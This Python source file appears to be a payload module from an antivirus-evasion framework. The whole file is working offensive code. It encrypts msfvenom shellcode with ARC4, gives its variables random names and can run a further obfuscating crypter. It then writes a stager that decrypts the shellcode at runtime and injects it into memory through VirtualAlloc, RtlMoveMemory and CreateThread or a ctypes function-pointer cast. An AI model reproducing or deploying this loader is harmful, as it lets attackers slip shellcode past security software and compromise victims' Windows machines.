"""

...description...


Great examples and code adapted from 
http://www.laurentluce.com/posts/python-and-cryptography-with-pycrypto/

module by @christruncer

"""



from Crypto.Cipher import ARC4

from modules.common import shellcode
from modules.common import randomizer
from modules.common import crypters


class Payload:
	
	def __init__(self):
		# required options
		self.description = "ARC4 Encrypted shellcode is decrypted at runtime with key in file, injected into memory, and executed"
		self.language = "python"
		self.rating = "Excellent"
		self.extension = "py"

		self.shellcode = shellcode.Shellcode()
		# options we require user interaction for- format is {Option : [Value, Description]]}
		self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
						"use_pyherion" : ["N", "Use the pyherion encrypter"],
						"inject_method" : ["virtual", "[virtual]alloc or [void]pointer"]}
		
	
	def generate(self):
		if self.required_options["inject_method"][0].lower() == "virtual":
		
			# Generate Shellcode Using msfvenom
			Shellcode = self.shellcode.generate()
		
			# Generate Random Variable Names
			RandPtr = randomizer.randomString()
			RandBuf = randomizer.randomString()
			RandHt = randomizer.randomString()
			ShellcodeVariableName = randomizer.randomString()
			RandIV = randomizer.randomString()
			RandARCKey = randomizer.randomString()
			RandARCPayload = randomizer.randomString()
			RandEncShellCodePayload = randomizer.randomString()
				
			# Set IV Value and ARC Key
			iv = randomizer.randomKey(8)
			ARCKey = randomizer.randomKey(8)

			# Create DES Object and encrypt our payload
			arc4main = ARC4.new(ARCKey)
			EncShellCode = arc4main.encrypt(Shellcode)
		
			PayloadCode = 'from Crypto.Cipher import ARC4\n'
			PayloadCode += 'import ctypes\n'
			PayloadCode += RandIV + ' = \'' + iv + '\'\n'
			PayloadCode += RandARCKey + ' = \'' + ARCKey + '\'\n'
			PayloadCode += RandARCPayload + ' = ARC4.new(' + RandARCKey + ')\n'
			PayloadCode += RandEncShellCodePayload + ' = \'' + EncShellCode.encode("string_escape") + '\'\n'
			PayloadCode += ShellcodeVariableName + ' = bytearray(' + RandARCPayload + '.decrypt(' + RandEncShellCodePayload + ').decode(\'string_escape\'))\n'
			PayloadCode += RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len('+ ShellcodeVariableName +')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
			PayloadCode += RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n'
			PayloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
			PayloadCode += RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
			PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'
		
			if self.required_options["use_pyherion"][0].lower() == "y":
				PayloadCode = crypters.pyherion(PayloadCode)

			return PayloadCode

		else:
			# Generate Shellcode Using msfvenom
			Shellcode = self.shellcode.generate()
		
			# Generate Random Variable Names
			RandPtr = randomizer.randomString()
			RandBuf = randomizer.randomString()
			RandHt = randomizer.randomString()
			ShellcodeVariableName = randomizer.randomString()
			RandIV = randomizer.randomString()
			RandARCKey = randomizer.randomString()
			RandARCPayload = randomizer.randomString()
			RandEncShellCodePayload = randomizer.randomString()
			RandShellcode = randomizer.randomString()
			RandReverseShell = randomizer.randomString()
			RandMemoryShell = randomizer.randomString()
				
			# Set IV Value and ARC Key
			iv = randomizer.randomKey(8)
			ARCKey = randomizer.randomKey(8)

			# Create DES Object and encrypt our payload
			arc4main = ARC4.new(ARCKey)
			EncShellCode = arc4main.encrypt(Shellcode)
		
			PayloadCode = 'from Crypto.Cipher import ARC4\n'
			PayloadCode += 'from ctypes import *\n'
			PayloadCode += RandIV + ' = \'' + iv + '\'\n'
			PayloadCode += RandARCKey + ' = \'' + ARCKey + '\'\n'
			PayloadCode += RandARCPayload + ' = ARC4.new(' + RandARCKey + ')\n'
			PayloadCode += RandEncShellCodePayload + ' = \'' + EncShellCode.encode("string_escape") + '\'\n'
			PayloadCode += ShellcodeVariableName + ' = ' + RandARCPayload + '.decrypt(' + RandEncShellCodePayload + ').decode(\'string_escape\')\n'
			PayloadCode += RandMemoryShell + ' = create_string_buffer(' + ShellcodeVariableName + ', len(' + ShellcodeVariableName + '))\n'
			PayloadCode += RandShellcode + ' = cast(' + RandMemoryShell + ', CFUNCTYPE(c_void_p))\n'
			PayloadCode += RandShellcode + '()'

			if self.required_options["use_pyherion"][0].lower() == "y":
				PayloadCode = crypters.pyherion(PayloadCode)

			return PayloadCode